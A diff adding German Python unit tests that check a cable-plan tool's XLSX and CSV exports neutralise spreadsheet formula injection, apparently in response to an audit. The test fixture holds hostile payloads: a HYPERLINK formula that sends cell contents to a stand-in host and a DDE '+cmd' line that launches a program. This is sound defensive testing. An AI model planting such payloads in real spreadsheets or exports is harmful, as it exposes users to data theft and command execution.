@@ -669,6 +669,51 @@ class TestTabellen(unittest.TestCase):
         self.assertEqual(felder["Firma"], "Musterfirma")
         self.assertEqual(felder["Standort"], "Keller")
 
+    def _boeses_projekt(self) -> Projekt:
+        """Ein Projekt mit Namen, die als Formel gelesen werden koennten."""
+        v = Verteiler.aus_geometrie(1, 2, 10, name="=1+1", nummer="V-01")
+        v.kabel_anlegen(
+            '=HYPERLINK("http://x?a="&A1,"Klick")', 1, 1, 2,
+            kabeltyp="jystyv", da_gesamt=2,
+        )
+        v.leiste(1).stift(1).a.bemerkung = "+cmd|' /C calc'!A0"
+        v.leiste(1).stift(1).b.bemerkung = "-48V"
+        return Projekt(verteiler=v, briefkopf={"firma": "@SUM(1)"})
+
+    def test_mappe_fuehrt_keine_formel_aus(self):
+        """Keine Zelle der Mappe bleibt eine Formel (Audit 1)."""
+        from openpyxl import load_workbook
+
+        ziel = xlsx_schreiben(self._boeses_projekt(),
+                              Path(self.ordner.name) / "boese.xlsx")
+        mappe = load_workbook(ziel)
+        formeln = [
+            (blatt.title, z.coordinate, z.value)
+            for blatt in mappe.worksheets
+            for r in blatt.iter_rows() for z in r
+            if z.data_type == "f"
+        ]
+        self.assertEqual(formeln, [])
+        # Der gefaehrliche Name steht trotzdem lesbar als Text drin.
+        texte = [
+            z.value for blatt in mappe.worksheets
+            for r in blatt.iter_rows() for z in r
+            if isinstance(z.value, str) and z.value.startswith("=HYPERLINK")
+        ]
+        self.assertTrue(texte)
+
+    def test_csv_entschaerft_formelzeichen(self):
+        """Keine CSV-Zelle beginnt mit = + - @ (Audit 1)."""
+        ziel = csv_schreiben(self._boeses_projekt(),
+                             Path(self.ordner.name) / "boese.csv")
+        with ziel.open(encoding="utf-8-sig", newline="") as datei:
+            felder = [f for zeile in csv.reader(datei, delimiter=";") for f in zeile]
+        for feld in felder:
+            self.assertFalse(feld[:1] in "=+-@\t\r" and feld,
+                             f"ungeschuetzt: {feld!r}")
+        # Der Name steht als Text da, mit Apostroph davor.
+        self.assertIn("'=HYPERLINK(\"http://x?a=\"&A1,\"Klick\")", felder)
+
 
 if __name__ == "__main__":
     unittest.main()
